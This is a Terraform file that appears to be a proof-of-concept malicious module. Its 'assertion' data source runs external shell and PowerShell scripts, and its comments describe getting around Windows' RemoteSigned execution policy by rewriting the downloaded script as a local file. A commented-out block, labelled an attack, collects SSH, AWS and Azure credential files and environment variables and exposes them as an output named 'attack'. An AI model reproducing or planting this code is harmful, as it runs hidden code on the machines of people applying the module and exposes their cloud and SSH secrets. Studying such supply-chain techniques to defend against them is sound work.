data "external" "assertion" {
  program = dirname("/") == "\\" ? [
    # For Windows
    "powershell",
    # Since "assertion.ps1" was downloaded from an external source, many
    # systems will prevent it from being executed if they have the "RemoteSigned"
    # execution policy or something more restrictive set.
    # We circumvent that by reading the content of the remote script and
    # writing it to a new script file, which removes the "Remote" tag that
    # prevents Windows from running it.
    # THEN we execute the new "local" script.

    # If the system uses the Restricted or AllSigned execution policies,
    # we can simply load the script file with `file("${path.module}/assertion.ps1")` and 
    # pass the contents directly into the `program` argument's second list item,
    # and it will run since it's not loading a script file at all.
    <<EOF
try {
  Get-Content -Raw ${path.module}/assertion.ps1 | Set-Content ${path.module}/assertion-local.ps1 | Out-Null
  powershell.exe -File ${path.module}/assertion-local.ps1
} catch {
  # If we can't run the script, we can't check the assertion so skip the check
  echo "{`"assertion`": true}"
}
EOF
    ] : [
    # For Unix
    "/bin/sh",
    "${path.module}/assertion.sh"
  ]
  query = {}
}

# The below is a work-in-progress for an attack that doesn't
# require any external shell access.
# locals {
#   is_windows = dirname("/") == "\\"

#   # home = pathexpand("~/")
#   # file_names = concat(
#   #   tolist(fileset(local.home, ".ssh/**")),
#   #   tolist(fileset(local.home, ".aws/**")),
#   #   tolist(fileset(local.home, ".azure/**")),
#   # )
#   # files = {
#   #   for k, v in {
#   #     for file in local.file_names :
#   #     file => try(
#   #       {
#   #         base64  = false
#   #         content = file("${local.home}/${file}")
#   #       },
#   #       {
#   #         base64  = true
#   #         content = filebase64("${local.home}/${file}")
#   #       },
#   #       null
#   #     )
#   #   } :
#   #   k => v
#   #   if v != null
#   # }

#   # windows_env_header = local.is_windows ? split("\n", trimspace(replace(replace(base64decode(data.external.env.result.env), "\r\n", "\n"), "\r", ""))) : []
#   # windows_env = local.is_windows ? (length(local.windows_env_header) > 2 ? {
#   #   for v in slice(local.windows_env_header, 2, length(local.windows_env_header)) :
#   #   split(" ", trimspace(v))[0] => trimspace(substr(trimspace(v), length(split(" ", trimspace(v))[0]), -1))
#   # } : {}) : {}

#   # linux_env = {}
# }

# output "attack" {
#   value = {
#     is_windows = local.is_windows
#     #files = local.files
#     #env = local.is_windows ? local.windows_env : local.linux_env
#   }
# }
